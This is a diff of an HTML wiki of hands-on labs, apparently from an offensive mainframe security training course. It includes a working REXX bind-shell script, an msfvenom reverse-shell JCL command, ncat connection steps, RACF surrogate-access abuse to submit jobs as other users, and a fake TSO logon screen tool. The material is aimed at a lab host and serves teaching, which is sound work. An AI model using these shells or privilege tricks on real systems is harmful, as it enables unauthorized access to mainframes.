@@ -8924,7 +8924,7 @@ Error message and password prompt
         },
         &quot;$:/info/url/full&quot;: {
             &quot;title&quot;: &quot;$:/info/url/full&quot;,
-            &quot;text&quot;: &quot;file:///Users/chad/WorkInProgress/Labs/Day_1/Day1_Labs.html&quot;
+            &quot;text&quot;: &quot;file:///home/evilmf/Labs/Day_1/Day1_Labs.html&quot;
         },
         &quot;$:/info/url/host&quot;: {
             &quot;title&quot;: &quot;$:/info/url/host&quot;,
@@ -8944,7 +8944,7 @@ Error message and password prompt
         },
         &quot;$:/info/url/pathname&quot;: {
             &quot;title&quot;: &quot;$:/info/url/pathname&quot;,
-            &quot;text&quot;: &quot;/Users/chad/WorkInProgress/Labs/Day_1/Day1_Labs.html&quot;
+            &quot;text&quot;: &quot;/home/evilmf/Labs/Day_1/Day1_Labs.html&quot;
         },
         &quot;$:/info/url/search&quot;: {
             &quot;title&quot;: &quot;$:/info/url/search&quot;,
@@ -8956,11 +8956,11 @@ Error message and password prompt
         },
         &quot;$:/info/browser/screen/width&quot;: {
             &quot;title&quot;: &quot;$:/info/browser/screen/width&quot;,
-            &quot;text&quot;: &quot;1792&quot;
+            &quot;text&quot;: &quot;1920&quot;
         },
         &quot;$:/info/browser/screen/height&quot;: {
             &quot;title&quot;: &quot;$:/info/browser/screen/height&quot;,
-            &quot;text&quot;: &quot;1120&quot;
+            &quot;text&quot;: &quot;1107&quot;
         }
     }
 }</pre>
@@ -9077,33 +9077,36 @@ Error message and password prompt
     }
 }</pre>
 </div>
-<div created="20181014014053567" modified="20190513183522020" tags="" title="BONUS - msfvenom">
+<div created="20181014014053567" modified="20201022234116024" tags="" title="BONUS - msfvenom">
 <pre>!!''Lab Objective''
 # Using Metasploit to generate JCL+HLASM
 # Using the generated JCL to get a USS shell
 
 !!''Create HLASM JCL with Metasploit''
-* Generate the JCL: `msfvenom -p cmd/mainframe/reverse_shell_jcl LHOST='&lt;your ip&gt;' LPORT=4321 &gt; hlasmuss`
+* Generate the JCL: `msfvenom -p cmd/mainframe/reverse_shell_jcl LPORT=&lt;number between 20000 and 39999&gt; &gt; hlasmuss`
 ** This creates the file `hlasmuss`
 * Upload the file to `&lt;userid&gt;.JCLLIB(HLASMUSS)`
 ** Using any of the methods from the previous labs
-* Edit `&lt;userid&gt;.JCLLIB(HLASMUSS)` and change 'DUMMY' 
+* Edit `&lt;userid&gt;.JCLLIB(HLASMUSS)` and change 'DUMMY' to `&lt;userid&gt;S`
 ** refer to other labs on how to have a good job card
 
 !!''Connect''
-* In Linux setup a NetEBCDICat listener on port 4321
 * On the mainframe `SUBMIT` the JCL `&lt;userid&gt;.JCLLIB(HLASMUSS)`
-* ''Question'' Why do we need to use NetEBCDICat again?
+* In kali run the python script `netEBCDICat.py` in the `~/Tools` folder to connect to the listening shell
+** Use the output from help to figure out the command syntax
+
+!!!''Evil Thinking''
+* Why do we need to use `netEBCDICat.py` instead of `ncat` ?
 </pre>
 </div>
-<div created="20181014014450786" modified="20190513183507389" tags="" title="BONUS Lab - TN3270">
+<div created="20181014014450786" modified="20201022235353401" tags="" title="BONUS Lab - TN3270">
 <pre>!!''Lab Objectives''
 # Interact with TN3270 with Python
 # Use Set'n'3270 to create fake TSO logon screen
 
 !!''Copy tn3270lib''
 * In tools folder is `tn3270lib/tn3270lib.py`
-* Copy this file to the Lab_07 folder: `cp ~/Labs/Tools/tn3270lib/tn3270lib.py ~/Labs/Day_1/Lab_07/`
+* Copy this file to the Lab_07 folder: `cp ~/Tools/tn3270lib/tn3270lib.py ~/Labs/Day_1/Lab_07/`
 * Make sure your working directory is ''Lab_07'': `cd ~/Labs/Day_1/Lab_07`
 
 !!''Connect with python''
@@ -9111,7 +9114,7 @@ Error message and password prompt
 * import the tn3270 library: `import tn3270lib`
 * Connect using the initiate function
 ** `&gt;&gt;&gt; tn3270 = tn3270lib.TN3270()`
-** `&gt;&gt;&gt; tn3270.initiate(&quot;evilmf, 992)`
+** `&gt;&gt;&gt; tn3270.initiate(&quot;evilmf.evilmainframe.com&quot;, 992)`
 
 !!''Send Data''
 * Use the python library to send the 'IBMTEST' vtam command
@@ -9128,25 +9131,28 @@ Error message and password prompt
 
 1) Launch SET'n'3270 in listen mode
 
-* `./SETn3270.py` 
-* Connect with x3270 on localhost port 23: `x3270 localhost`
+* You can find this tool in `~/Tools/SETn3270`
+* `sudo ./SETn3270.py` 
+* Connect with x3270 on localhost port 23: `x3270 127.0.0.1`
 
 2) Launch SET'n'3270 in target mode
 
-* `./SETn3270.py -p 2023 evilmf`
-* Connect with x3270 on localhost port 2023 (plaintext): `x3270 localhost:2023`
-</pre>
+* `sudo ./SETn3270.py -p 992 evilmf.evilmainframe.com`
+* Connect with x3270 on localhost port 992: `x3270 127.0.0.1:992`
+
+
+!!!''Evil Thinking''
+* How could an attacker use SET'n'3270 in a corporate environment?</pre>
 </div>
-<div created="20190513164624050" modified="20200106111618702" tags="" title="Lab 1 - Login, Copy/Paste a File and Run It">
+<div created="20190513164624050" modified="20201022213308202" tags="" title="Lab 1 - Login, Copy/Paste a File and Run It">
 <pre>!!''Before Starting - Update''
 * Make sure you have the most up do date labs
 * Update the labs folder:
-* type `git pull` in the `/root/Labs` folder
-* Update the Tools folder: `cd Tools` then `./update_submodule.sh`
+** type `git pull` in the `~/Labs` folder
 * Reload this Wiki by closing your browser and reopening the file
 
 !!''If you get stuck!''
-* Open the Notes wiki in the `/root/Labs/Notes` folder
+* Open the Notes wiki in the `~/Labs/Notes` folder
 * Scroll down to ''ISPF Navigation'' for helpful tips on navigating TSO/ISPF
 * Read the screen thoroughly it might tell you your error
 
@@ -9160,14 +9166,14 @@ Error message and password prompt
 
 !!''Connecting to our LPAR (aka server)'':
 
-* ''From terminal'': `x3270 L:evilmf:992`
+* ''From terminal'': `x3270 L:evilmf.evilmainframe.com:992`
 * ''From GUI'':
 ** Launch x3270
 ** Click connect
-** Type `L:evilmf:992`
+** Type `L:evilmf.evilmainframe.com:992`
 
 !!''Accessing TSO''
-* Before proceding you must have a userid: `EVIL10` through `EVIL45`
+* ⚠️ Before proceeding you must have a userid: `EVIL10` through `EVIL45`
 * Type `LOGON APPLID(TSO)` or `TSO`
 ** ''Advanced'': `LOGON APPLID(TSO) DATA(&lt;userid&gt;)` or `TSO &lt;userid&gt;`
 ** Replacing `&lt;userid&gt;` with your logon id
@@ -9188,7 +9194,7 @@ Error message and password prompt
 * Hit `F3` to exit this screen
 * Type `=3.2` in `Command ===&gt;` line to go to the `Dataset Utility` panel
 * In `Option ===&gt;` line type `A` hit tab (or click) until cursor is at line `Name  . . . . . . .`
-** Type `'&lt;userid&gt;.REXXLIB'` and hit enter (''NOTE the single quotes in the file name'') this will ''A''llocate a new partitioned dataset
+** Type `'&lt;userid&gt;.REXXLIB'` and hit enter (''⚠️ NOTE the single quotes in the file name'') this will ''A''llocate a new partitioned dataset
 ** hit enter again on 'Allocate Dataset' screen (all this information is prepopulated from when we got the file information in the previous steps)
 ** You should see ''Dataset Allocated'' in white in the top right of the screen
 ** This will have created the file `EVIL&lt;id#&gt;.REXXLIB`
@@ -9196,7 +9202,7 @@ Error message and password prompt
 * In `Dsname Level . . .` type `EVIL.**` hit enter to list all datasets that start with `EVIL`
 * Move or click the cursor to the command column in front of `EVIL.REXX`
 * Type `V` (for ''view'') and hit enter, this will open the PDS (or folder)
-* In the command column, next to `LAB01`, in the `_________` type `V` again and hit enter, this opens the file `LAB01` in read only mode
+* In the command column, next to `LAB01`, in the `_________` area type `V` again and hit enter, this opens the file `LAB01` in read only mode
 * In the `Command ===&gt;` line type `CUT` and hit enter, this copies the whole file to your copy/paste buffer
 * On the command line type `=3.4`  and hit enter
 * In `Dsname Level . . .` line type `&lt;userid&gt;.**` and hit enter
@@ -9204,7 +9210,7 @@ Error message and password prompt
 * You are now in an empty folder (PDS)
 ** create a new member by typing in the `Command ===&gt;` line `S LAB01` and hit enter
 ** In the `Command ===&gt;` line type `res`, for reset, and hit enter to clear any messages
-** In the `Command ===&gt;` line type `paste` and place/click the cursor on the first line with 6 red asterisks `******` and type `A`, for &quot;paste after this line&quot;, and hit enter
+** In the `Command ===&gt;` line type `paste` and place/click the cursor on the first line with 6 red asterisks `******` and type `A`, for &quot;paste After this line&quot;, and hit enter
 ** Go to `Command ===&gt;` line, type `save` and hit enter to save the file
 ** hit `F3` to exit the file
 
@@ -9213,9 +9219,11 @@ Error message and password prompt
 * In `Dsname Level . . .` line type `&lt;userid&gt;.**` and hit enter
 * Put (or click) the cursor next to to `&lt;userid&gt;.REXXLIB` and in the command column put `E` for ''E''dit and hit enter
 * In the command column, next to `LAB01`, in the `_________` type `E` again and hit enter, this opens the file `LAB01` in edit mode
-** ''Note:'' if you make a mistake editing type `cancel` on the command line, `F3` will autosave
+** ''⚠️ Note:'' if you make a mistake editing type `cancel` on the command line, If you try to exit with `F3` it will autosave
 * ''Edit the REXX script''
-** On line 3, in the command column (thats the column with `*****` in red) type `i3`, this will insert 3 new lines
+** In the `Command ===&gt;` line type `res`, for reset, and hit enter to clear any `==MSG&gt;` messages
+** In the `Command ===&gt;` line type `hilite on` to turn on syntax highlighting
+** On line 3, in the command column (thats the column with `*****` in red) type `i3`, this will insert 3 new lines (you will be overtyping `000300`)
 ** type in the edit area `SAY 'Evil mainframe is the best'`
 ** hit enter and notice the extra blank lines go away
 ** In the `Command ===&gt;` line type `UNNUM;NUM OFF`
@@ -9223,22 +9231,23 @@ Error message and password prompt
 * ''EXECute the REXX Script''
 ** In the editor:
 *** In the `Command ===&gt;` line type `TSO EXEC '&lt;userid&gt;.REXXLIB(LAB01)' 'ARGS!'`
-**** Note: Make sure you replace `&lt;userid&gt;` with your `EVIL#` userid
+**** ⚠️ Note: Make sure you replace `&lt;userid&gt;` with your `EVIL#` userid
 ** In ISPF
 *** In the `Command ===&gt;` line type `=6`
 *** In the `===&gt;` line type `EXEC '&lt;userid&gt;.REXXLIB(LAB01)' 'ARGUMENTS!'`
 ** In TSO
-*** In the `Command ===&gt;` or `===&gt;` line type `=x` and follow the instructions to delete if you need to
+*** In the `Command ===&gt;` or `===&gt;` line type `=x` (follow the instructions to delete, option 2, if you need to)
 *** You should be at the red `READY` prompt
 *** Type `EXEC '&lt;userid&gt;.REXXLIB(LAB01)' 'NOT IN ISPF!'`
 
 !!''Unix''
-* Use ssh to logon to the mainframe: `ssh &lt;userid&gt;@evilmf`
+* Use ssh to logon to the mainframe: `ssh &lt;userid&gt;@evilmf.evilmainframe.com`
 ** Enter your `EVIL#` username and password
+* Bash is installed, if you want to use it type `bash` but the labs work in tcsh as well
 * Copy the REXX script to your home folder: `cp &quot;//'&lt;userid&gt;.REXXLIB(LAB01)'&quot; ~/LAB01`
 * Make the REXX script executable: `chmod +x ~/LAB01`
 * Execute the REXX script: `~/LAB01 'IN UNIX NOW!'`
-** Review the output and compare it to when you ran it in TSO, whats different?
+** Review the output and compare it to when you ran it in TSO, whats different? Why is it different?
 
 !!''CONGRATS YOU DID IT!''
 
@@ -9258,7 +9267,7 @@ RETURN 0
 ```
 </pre>
 </div>
-<div created="20190513171651997" modified="20190610183205976" tags="" title="Lab 2 - REXX Shells">
+<div created="20190513171651997" modified="20201022223624474" tags="" title="Lab 2 - REXX Shells">
 <pre>!!''Lab Objectives''
 # Uploading a file to a mainframe
 # Setting up REXX sockets
@@ -9267,14 +9276,14 @@ RETURN 0
 # Executing again
 
 !!''Connecting''
-Start by connecting to EvilMF and getting to ISPF (Refer to `Lab 1` for instructions)
+Start by connecting to `evilmf.evilmainframe.com` and getting to ISPF (Refer to `Lab 1` for instructions)
 
 If you get stuck refer to ''ISPF Naviation'' for help
 
 !!''Create REXX Script in Linux''
 
 * Copy the REXX script below to a file in Linux
-* ''NOTE'' using vim below is just an example, you can use any Linux text editor you please
+* ''⚠️ NOTE'' using vim below is just an example, you can use any Linux text editor you like
 ** In terminal on Kali type: `vim ~/USHELL`
 *** Then in vim type `i`
 ** Select the REXX script below (in the gray box)
@@ -9284,6 +9293,7 @@ If you get stuck refer to ''ISPF Naviation'' for help
 /* REXX */
 parse arg p
 mf_ip = '0.0.0.0'
+say 'Opening shell on' mf_ip||':'||p
 n = &quot;25&quot;x
 r = &quot;$ &quot;
 s = SOCKET('INITIALIZE','DAEMON',2)
@@ -9298,6 +9308,7 @@ s = Socket('Listen',socketID,2)
 parse var s src .
 clients = ''
 DO FOREVER
+SAY 'READING SOCKET' SOCKETID
  s = Socket('Select','READ' socketID clients 'WRITE' 'EXCEPTION')
  parse upper var s 'READ' readin 'WRITE' writtin 'EXCEPTION' exceptin
  IF INLIST(socketID,readin) THEN DO
@@ -9335,19 +9346,18 @@ INLIST: procedure
  end
  return 0
 ```
-* More shells are available here: https://github.com/mainframed/Shells
+* More shells are available here: https://github.com/mainframed/Shells and in the folder `~/Tools/Shells`
 
 
 !!''Uploading a File''
 Use ''ONE'' of the three methods below to create the file `&lt;userid&gt;.REXXLIB(USHELL)`
 
 !!!''1 - FTP''
-* If you wish to use this method you must install `tnftp`
-** `apt install tnftp` will replace your ftp client
-* Use FTP to connect EVILMF `ftp evilmf` and follow the prompts to logon
+* Use FTP to connect EVILMF `ftp evilmf.evilmainframe.com` and follow the prompts to logon
 * Change working directory to REXXLIB `cd REXXLIB`
 * Change the upload mode to ascii, type `ascii` and hit enter
 * Upload `USHELL` in your home foler: `PUT USHELL`
+* to exit type `bye`
 
 !!!''2 - Copy/Paste''
 * Type `=3.4` on the ISPF `Command ===&gt;` line, hit enter to enter file browser
@@ -9361,9 +9371,9 @@ Use ''ONE'' of the three methods below to create the file `&lt;userid&gt;.REXXLI
 * ''In x3270'' make sure `Options -&gt; Toggles -&gt; Paste with Left Margin` is enabled
 * place cursor on the line under first blue asterisk 
 * paste file contents with `CTRL + V` on laptop keyboard and hit enter
-* In `Scroll ===&gt;` in upper left replace `PAGE` with `CSR` this changes the scrolling using `F8` from page to whereever your cursor is
-* Place your cursor on line 15, in the comman column
-* Hi `F8`
+* In `Scroll ===&gt;` in upper left replace `PAGE` with `CSR` this changes the scrolling using `F8` from page to where ever your cursor is
+* Place your cursor on line 15, in the command column
+* Hit `F8`
 * In the command column type `i15`
 * Paste the script
 * Repeat these steps until the entire script is pasted
@@ -9373,41 +9383,43 @@ Use ''ONE'' of the three methods below to create the file `&lt;userid&gt;.REXXLI
 * Make sure your cursor is on the `===&gt;` line
 * ''In x3270'' select `File --&gt; File Transfer...`
 * In dialogue box popup put:
-** Local File Name: `/root/USHELL`
+** Local File Name: `/home/evilmf/USHELL`
 ** Host File Name: `'&lt;userid&gt;.REXXLIB(USHELL)'`
-*** ''NOTE'' don't forget the single quotes or it will error out!
+*** ''⚠️ NOTE'' do not forget the single quotes or it will fail
 ** Select the option `Send to Host`
 ** Select the option `Transfer ASCII File`
 ** Leave the rest as is
 ** Click `Transfer File`
 
 !!''Execute Shell''
-* Using the examples in the previous lab execute the rexx scrip `&lt;userid&gt;.REXXLIB(USHELL)` and pass it the argument of a port in the 20,000 to 39,999 range
+* Using the examples in the previous lab execute the rexx script `&lt;userid&gt;.REXXLIB(USHELL)` and pass it the argument of a port in the 20,000 to 39,999 range
 ** `EX 'EVIL0.REXXLIB(USHELL)' '39999'`
-** ''NOTE'' DO NOT ALL USE 39999 OR ELSE YOUR BIND WILL FAIL
-* Connect with ncat `ncat evilmf &lt;port&gt;`
-* Notice that when you connect your get garbage 
+** ''⚠️NOTE'' DO NOT ALL USE 39999 OR ELSE YOUR BIND WILL FAIL
+* Connect with ncat `ncat evilmf.evilmainframe.com &lt;port&gt;`
+* Notice that when you connect you get `[@`, if you type `ls` you get garbage
+** Before proceeding to the next section think why?
+* When you're done hit `&lt;ctrl&gt;-c` to exit ncat, the rexx script will error out, this is fine
 
 !!''Fix the Script''
-* Edit the script in TN3270
-** Follow the guide from the last lab
+* Edit the script in ISPF
+** Follow the guide from the previous lab
 * On line 13 add insert the following, like you did in Lab 1
 ```
   s = Socket('Setsockopt',socketID,'SOL_SOCKET','SO_ASCII','ON')
 ```
 * Save and execute the script
 ** Type `save` on the `Command ===&gt;` line
-** Type `tso ex '&lt;userid&gt;.REXXLIB(USHELL)' '&lt;port&gt;'`
+** Then type `tso ex '&lt;userid&gt;.REXXLIB(USHELL)' '&lt;port&gt;'` on the `Command ===&gt;` line
 * Connect with ncat again
 * At this point you should have a Unix shell prompt in ncat
-** ''If not'' put your hand up and we'll help
-* Navigate Unix with this shell
-* Notice anything wrong with it?
-
+** ''If not'' let us know and we'll help
+* Try navigating Unix with this shell
+** Do you notice anything wrong with it? What?
+* To exit hit `&lt;ctrl&gt;-c`
 !!''BONUS''
-* Feel free to try any of the reverse shells from https://github.com/mainframed/Shells</pre>
+* Feel free to try any of the shells in the folder `~/Tools/Shells`</pre>
 </div>
-<div created="20190513175425933" modified="20190611174418532" tags="" title="Lab 3 - Jobs and JCL">
+<div created="20190513175425933" modified="20201022221657997" tags="" title="Lab 3 - Jobs and JCL">
 <pre>!''Lab Objective''
 # Creating a Job Card
 # Editing your first JCL
@@ -9426,7 +9438,7 @@ Use ''ONE'' of the three methods below to create the file `&lt;userid&gt;.REXXLI
 * Hit `F3` to exit this screen
 * Type `=3.2` in `Command ===&gt;` line to go to the `Dataset Utility` panel
 * In `Option ===&gt;` line type `A` hit tab (or click) until cursor is at line `Name  . . . . . . .`
-** Type `'&lt;userid&gt;.JCLLIB'` and hit enter (''NOTE the single quotes in the file name'') this will ''A''llocate a new partitioned dataset
+** Type `'&lt;userid&gt;.JCLLIB'` and hit enter (''⚠️ NOTE the single quotes in the file name'') this will ''A''llocate a new partitioned dataset
 ** hit enter again on 'Allocate Dataset' screen (all this information is prepopulated from when we got the file information in the previous steps)
 ** You should see ''Dataset Allocated'' in white in the top right of the screen
 ** This will have created the file `EVILID#.JCLLIB`
@@ -9447,26 +9459,26 @@ Use ''ONE'' of the three methods below to create the file `&lt;userid&gt;.REXXLI
 ** hit `F3` to exit the file 
 
 !!''Editing Your File and Submitting a Job''
-* ''Note'' at this point you should be at a screen listing the contents of `EVIL#.JCLLIB` if not you'll need to type `E`, for `EDIT` next to `EVIL#.JCLLIB`
+* ''⚠️ Note'' at this point you should be at a screen listing the contents of `EVIL##.JCLLIB` if not you'll need to type `E`, for `EDIT` next to `EVIL##.JCLLIB`
 * In the command column, next to `LAB03`, in the `_________` type `E`and hit enter, this opens the file `LAB03` in edit mode
 * In the command line type `RES` and hit enter to clear any messages
+* To turn on syntax highlighting you can type `hilite jcl`
 * Replace/change all instances of `&lt;user&gt;` to your assigned userid (e.g. `EVIL12`)
-** ''NOTE'' If you get stuck make sure you review the tips in `ISPF Navigation` in the notes wiki
-* Once done making your changes,  in the `Command ===&gt;` line type `SAVE` and hit enter
-* in the `Command ===&gt;` line type `SUBMIT` and hit enter
-** this submits the JCL you've edited to JES
+** ''⚠️ NOTE'' If you get stuck make sure you review the tips in `ISPF Navigation` in the notes wiki
+* Once done making your changes,  on the `Command ===&gt;` line type `SAVE` and hit enter
+* on the `Command ===&gt;` line type `SUBMIT` and hit enter
+** this submits the JCL you've edited to JES2
 ** You should see `IKJ56250I JOB EVIL#x(JOB00###) SUBMITTED`, note these numbers down
 ** If you get prompted for a jobname type any letter and hit enter
 * Hitting enter you should see a message like: 
 ```
 01.36.50 JOB00### $HASP165 EVIL#x   ENDED AT EVIL  MAXCC=0000 CN(INTERNAL)`
 ```
-** If `MAXCC=` anything other than `0000` it means you have an issue in your JCL, you can use the steps below to see the errors
-** If instead of `MAXCC=` you get `JCL ERROR` it means your ''Job Card'' is incorrect, make sure you go back and read the DOs and DONTs of jobcards in the Notes wiki
+** If `MAXCC=` is anything other than `0000` it means you have an issue in your JCL, you can use the steps in teh section ''Get the Job Output'' section below to see the errors
+** If instead of `MAXCC=` you get `JCL ERROR` it means your ''Job Card'' is incorrect (the first line), make sure you go back and read the ''DOs and DONTs of jobcards'' in the Notes wiki
 * `MAXCC=` is like the job return code
 ** `0000` the job returned without issues to report
-** `0004`, `0008` and `00012` the job returned with an issue, it might still run, might not
-** `0016` there's issues with this JCL and it cant run
+** `0004`, `0008`, `0012` and `0016` the job returned with an issue, it might be fine, might not
 
 !!''Get the Job Output''
 
@@ -9479,13 +9491,11 @@ Use ''ONE'' of the three methods below to create the file `&lt;userid&gt;.REXXLI
 ** In `COMMAND INPUT ===&gt;` line type `ST` and hit enter to display the jobs for your userid
 ** Find the job that matches the JOBNAME(JOBID) `EVIL#x(JOB00###)` from above
 ** Tab or click your cursor, next to the matching job, and in the `NP` column on the far left type `?` and hit enter
-** Tab or click your curser next to `SYSTSPRT` and type `S`, for show, and hit enter
+** Tab or click your cursor next to `SYSTSPRT` and type `S` (stands for ''S''how), and hit enter
 ** Review the output and notice that this is the result of the TSO commands your JCL ran
 
 !!''FTP Jobs''
-* ''NOTE'' You must install `tnftp` for the ftp server in our lab to work
-** In kali you can install it with `apt install tnftp`
-* Connect `ftp evilmf` and follow the prompts to logon
+* Connect `ftp evilmf.evilmainframe.com` and follow the prompts to logon
 * Download your JCL by typing: 
 ** `cd JCLLIB` to go in to `&lt;userid&gt;.JCLLIB`
 ** `ascii` to switch to ASCII mode
@@ -9496,23 +9506,28 @@ Use ''ONE'' of the three methods below to create the file `&lt;userid&gt;.REXXLI
 * Then switch in to JES mode `site FILE=JES` and hit enter
 * Type `put LAB03`, this submits the job
 * type `ls` to list the job number
-* type `get JOB####` to download the job
+* type `get JOB#####` to download the job
+* Quit ftp by typing `bye`
+* cat the job output: `cat JOB#####`
+** Notice this has all the job output and your rexx script output is at the bottom
 
-!''Congrats you submitted your first job!''</pre>
+!''Congrats you submitted your first job and read the output!''</pre>
 </div>
-<div created="20181013224531694" modified="20190514112642824" tags="" title="Lab 4 - RACF">
+<div created="20181013224531694" modified="20201022223331994" tags="" title="Lab 4 - RACF">
 <pre>!!''Lab Objectives''
-# Using RACF program `SEARCH` to find datasets in warn mode and surrogate access
-# Using surrogate access to submit jobs as other users
+# Use RACF program `SEARCH` to find datasets in warn mode and surrogate access
+# Use surrogate access to submit jobs as other users
 
 !!''Access a Dataset in WARN mode''
 * issue TSO command: `SEARCH ALL WARNING NOMASK`
 ** If you're in ISPF prefix the command with `TSO` e.g. `TSO SEARCH ALL WARNING NOMASK`
+* At the bottom of the screen in red is the name of a dataset
 * Using ISPF View (with `V`) the file you have warn mode access to
 ** Follow the steps in Labs ''1'' and ''3'' to view a dataset
+* ''Notice'' the line `TEMPORARY ACCESS ALLOWED` which means your access was blocked but because it is in warn mode access is granted
 * ''Notice'' you can edit/view do whatever you want to a file in warn mode
 
-!!''See SURROGAT Access''
+!!''Check SURROGAT Access''
 * In TSO issue the command `SEARCH CLASS(SURROGAT) FILTER(*.SUBMIT)`
 * Note the user id of any profile you have access to
 ** i.e. if you see `EVIL99.SUBMIT` write down `EVIL99`
@@ -9522,25 +9537,29 @@ Use ''ONE'' of the three methods below to create the file `&lt;userid&gt;.REXXLI
 * In `Command ===&gt;` line type `CUT`
 * Hit `F3` to go back to the PDS 
 ** It Should say `EDIT              &lt;userid&gt;.JCCLIB` above the command line
-* in `Command ===&gt;` line type `s evillab` hit enter
+* in `Command ===&gt;` line type `s LAB04` hit enter
 * Paste the cut contents the same as in as `Lab 01`
 ** type `paste` on the `Command ===&gt;` line, and on the first line of red asterisks `******` type `A`
 - in `Command ===&gt;` line type `SAVE`
 
 !!''Surrogat Access - EDIT JCL File''
 * In job card add `,USER=&lt;Username from RACF SEARCH above&gt;`
-** put it after `MSGLEVEL=(1,1)` 
-* Change `NOTIFY=&amp;SYSUID` to `NOTIFY=&lt;your userid&gt;` (think about why we're doing this)
+** ''Hint'' put it after `MSGLEVEL=(1,1)` 
+* Change `NOTIFY=&amp;SYSUID` to `NOTIFY=&lt;your userid&gt;`
+** Why do we have to do this step? What do you think `&amp;SYSUID` is doing here?
 * Replace `EXEC 'EVIL.LABS(REXX)' . . . ` with `SEND 'WOULD YOU LIKE TO PLAY A GAME' USER(&lt;your userid&gt;) NOW` replacing `&lt;your userid&gt;` with your userid
+* save your changes
 * Submit the JCL by typing `submit` in the `Command ===&gt;` line and hitting enter
-* Notice you should get a message from user you identified above
+* Notice you should get a message from the user you identified above after you hit enter (if not just hit enter a few times)
 
-!!!''Now that we can submit jobs as another user what could we do with that?''
+!!!''Evil Thinking''
+* Now that we can submit jobs as another user what could we do with that?
+* How could we use this in a pentest?
 
 !''BONUS''
-* This is hard on purpose
-* This will be blind so if you made a mistake there's no way to test, you're better off testing without `USER=&lt;surrogat user&gt;` in the job card at first
-* Use `IEBGENER` to create the reverse shell
+* This part is hard on purpose, it is called ''BONUS'' not ''Easy boring times''
+* This will be blind so if you made a mistake there's no way to check, you're better off testing without `USER=&lt;surrogat user&gt;` in the job card at first
+* Using `IEBGENER` (thats the `PGM` below) to create the reverse shell
 * Add the following to your JCL right after the job card:
 ** Make sure you change `&lt;surrogat userid&gt;`
 ```
@@ -9567,51 +9586,57 @@ Use ''ONE'' of the three methods below to create the file `&lt;userid&gt;.REXXLI
 ```
 * Once you submit this job you should be able to connect on the port you selected with `ncat evilmf &lt;port&gt;`
 
+!!!''Evil Thinking''
+* What does `%SHELLED` do?
+* What is `&amp;&amp;OMG`?
+
 </pre>
 </div>
-<div created="20181013220222970" modified="20190611200239016" tags="" title="Lab 5 - Access Storage with REXX">
+<div created="20181013220222970" modified="20201022234104539" tags="" title="Lab 5 - Access Storage with REXX">
 <pre>!!''Lab Objectives''
-# Uploading a file to a mainframe
-# Running a REXX script
 # Viewing storage (i.e. memory) with REXX
 # Finding memory area information on IBM website
-# Displaying strings at bits in REXX
+# Displaying strings as bits in REXX
 
 !!''Connecting''
-Start by connecting to EvilMF and getting to ISPF (Refer to `Lab 1` for instructions)
+Start by connecting to `evilmf.evilmainframe.com` and getting to ISPF (Refer to `Lab 1` for instructions)
 
-As always, If you get stuck refer to ''ISPF Naviation'' for help
+As always, If you get stuck refer to ''ISPF Naviation'' in the Notes wiki for help
 
 !!''Copy/Paste File from Linux to EvilMF''
 
-* Upload the file `/root/Labs/Day_1/Lab_05/acee.rx` to your REXX library and call it ACEE: `&lt;userid&gt;.REXXLIB(ACEE)`
-* Use previous labs as examples
+* Upload the file `/home/evilmf/Labs/Day_1/Lab_05/acee.rx` to your REXX library and call it ACEE: `&lt;userid&gt;.REXXLIB(ACEE)`
+* Use previous labs as examples for how to upload a file
 
 !!''Execute REXX script''
 * In ISPF `Command ===&gt;` line type `TSO EX '&lt;userid&gt;.REXXLIB(ACEE)'` (''note'' the single quotes, can you remember why you need them?)
 ** You could also do this from `=6` screen or the `READY` TSO prompt
-** Or even Unix, but you're on your own
+** Or even Unix, but you're on your own for that
 * Review output in red at the bottom of the screen
-** e.g. `(EVIL1) (EVILLU10)`
-* ''NOTE'' the `***` means you need to hit enter
+** e.g. `(EVIL##) (EVILLU##)`
+* ''Remember'' the `***` means you need to hit enter
 
-!!''Edit REXX to Display Your ACEEFLG01''
+!!''Edit REXX to Display ACEEFLG01''
 * In command line type `=3.4` hit enter
 * In `Dsname Level . . .` line type  `&lt;userid&gt;.REXXLIB` and hit enter
 * In command column enter `E` hit enter to enter edit mode
 * In command column, in the `_________` next to ACEE type `E` and hit enter
-* In the number column , on line which starts &quot;acee_uid=&quot; overwrite `00` with `i3` and hit enter to insert 3 lines after that line
-* In a browser review the link below to determine the location, in ''HEX'' of ACEEFLG1: 
+* Insert 3 lines after the line that starts with &quot;acee_uid=&quot;
+* In a browser review the link below to determine the offset, in ''HEX'' of ACEEFLG1: 
 ** Link: http://publibfp.dhe.ibm.com/epubs/pdf/ich2c400.pdf 
-* Add the following to your REXX script: `aceeflg1 = storage(d2x(x2d(acee_ptr) + x2d(&quot;&lt;&lt;PUT LOCATION FROM LINK HERE&gt;&gt;&quot;)),1)`
+* Add the following to your REXX script: `aceeflg1 = storage(d2x(x2d(acee_ptr) + x2d(&quot;&lt;&lt;PUT OFFSET HERE&gt;&gt;&quot;)),1)`
 * Print the contents of our new variable in hex using `SAY C2X(aceeflg1)`
-** The function `C2X()` is a REXX built in function to convert a charater string to hex bytes
+** The function `C2X()` is a REXX built in function to convert a character string to hex bytes
 * Save the script
-* Execute the changed script as described above
-* ''BONUS PRIZE'': First person to print in binary gets a prize.
+* Execute the changed and notice what your ACEEFLG1 is set to
+
+!!''BONUS'': 
+
+* Using rexx, ''say'' ACEEFLG1 in binary instead of hex
+* What actual flags are set for your user id?
 </pre>
 </div>
-<div created="20181013215010143" modified="20190513183441828" tags="" title="Lab 6 - Accessing CICS" type="text/vnd.tiddlywiki">
+<div created="20181013215010143" modified="20201022232800391" tags="" title="Lab 6 - Accessing CICS" type="text/vnd.tiddlywiki">
 <pre>!!''Lab Objectives''
 # Accessing a CICS region
 # Accessing a CICS transaction
@@ -9620,7 +9645,7 @@ As always, If you get stuck refer to ''ISPF Naviation'' for help
 !!''Accessing CICS''
 * Connect to ''EvilMF'' with x3270 (refer to `Lab 1` for instructions)
 * Type `LOGON APPLID(CICSTS51)` and hit enter
-* You should see ASCII art `CICS` screen, this is the `CSGM` transaction
+* You should see ASCII art `CICS` screen, this is called the `CSGM` transaction
 * Using the virtual keyboard (see ''ISPF Navigation'' in the notes wiki for instructions) clear the screen:
 ** Open the virtual keyboard
 ** Click the button marked `Clear`
@@ -9629,6 +9654,7 @@ As always, If you get stuck refer to ''ISPF Naviation'' for help
 ** Next to `Userid . . . .` type your userid
 ** Next to `Password . . .` type your password
 ** Hit enter
+** You should see `DFHCE3549 Sign-on is complete (Language ENU).` in white
 * Clear the screen again
 * Type anywhere on the blank screen: `CEMT INQUIRE SYSTEM`
 ** This loads the CICS transaction CEMT and passes the arguments `INQUIRE` and `SYSTEM`
